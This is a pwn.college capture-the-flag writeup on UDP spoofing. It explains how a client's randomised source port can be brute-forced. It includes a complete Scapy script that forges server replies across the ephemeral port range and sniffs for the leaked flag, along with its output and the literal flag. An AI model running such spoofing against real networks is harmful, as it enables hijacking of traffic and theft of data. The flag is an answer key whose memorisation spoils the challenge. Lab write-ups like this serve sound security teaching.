---
layout: page
title: "🛰️ UDP Spoofing 3 – Writeup (pwn.college)"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📌 Challenge Summary

> In this level, spoofing becomes trickier: the source port used by the client is **no longer fixed**. This mimics real-world DNS vulnerabilities, where attackers exploited predictable port values to forge responses. The patch? Randomizing ports. Your goal is to **guess the correct source port** and **trick the client into thinking a spoofed server replied with a flag**.

---

## 🧠 Understanding the Setup

There are 3 main entities:

- `Server (10.0.0.3)` → Listens on UDP port `31337`
- `Client (10.0.0.2)` → Sends to server, receives a response, and may relay a flag to another host
- `You (Attacker @ 10.0.0.1)` → Want to **spoof a server** response and steal the flag

**Key part:**
- The client **randomizes** the port it uses to contact the server (just like secure DNS today).
- The spoofed server reply must be sent **to the correct ephemeral source port**.
- If successful, the client reads the spoofed message (e.g., `FLAG:10.0.0.1:12345`) and sends the real flag to the attacker's IP.

---

## 🔍 How We Exploit It

### 🔒 Challenge:
You don’t know the client’s source port. But it is:
- In the **ephemeral port range**, typically `49152–65535`
- Fixed **per socket**, so if you spoof enough ports, you’ll eventually hit the right one

---

## 🧪 Attack Plan

1. **Sniff** incoming UDP packets to attacker port (`12345`)
2. **Send forged responses** to `10.0.0.2` (the client) spoofed as `10.0.0.3` (the server)
3. **Cycle through all possible ports (49152–65535)** as the destination (i.e., client’s source)
4. Once you hit the right port → client sends the real flag to your listener

---

## 💣 Final Exploit – `new_spoof.py`

```python
from scapy.all import send, sniff, IP, UDP
import threading
import sys

attacker_ip = '10.0.0.1'
attacker_port = 12345
target_ip = '10.0.0.2'
spoofed_src_ip = '10.0.0.3'

found_flag = False

def udp_req():
    global found_flag
    print("[*] Starting to send spoofed responses...")
    for i in range(49152, 65536):
        if found_flag:
            break
        pkt = IP(dst=target_ip, src=spoofed_src_ip)/UDP(dport=i, sport=31337)
        payload = f'FLAG:{attacker_ip}:{attacker_port}'
        send(pkt/payload, verbose=False)
    print("[*] Finished sending spoofed packets.")

def sniffer():
    global found_flag

    def handle(pkt):
        global found_flag
        if pkt.haslayer(UDP) and pkt[UDP].dport == attacker_port:
            print("[*] Flag captured!")
            print(f"Data: {bytes(pkt[UDP].payload)}")
            pkt.show()
            found_flag = True
            sys.exit(0)

    print("[*] Sniffing for incoming flag response...")
    sniff(filter=f"udp and port {attacker_port}", prn=handle)

if __name__ == "__main__":
    t = threading.Thread(target=sniffer)
    t.daemon = True
    t.start()
    udp_req()
    t.join()
```

### Output
```bash
[*] Sniffing for incoming flag response...
[*] Starting to send spoofed responses...
[*] Flag captured!
Data: b'pwn.college{gGcSubLJQ-zf9ij0zlp1LQOwXsf.0lN0AjNxwSM0IzMyEzW}\n'
...
[*] Finished sending spoofed packets.
```

---

## Flag

```
pwn.college{gGcSubLJQ-zf9ij0zlp1LQOwXsf.0lN0AjNxwSM0IzMyEzW}
```
---
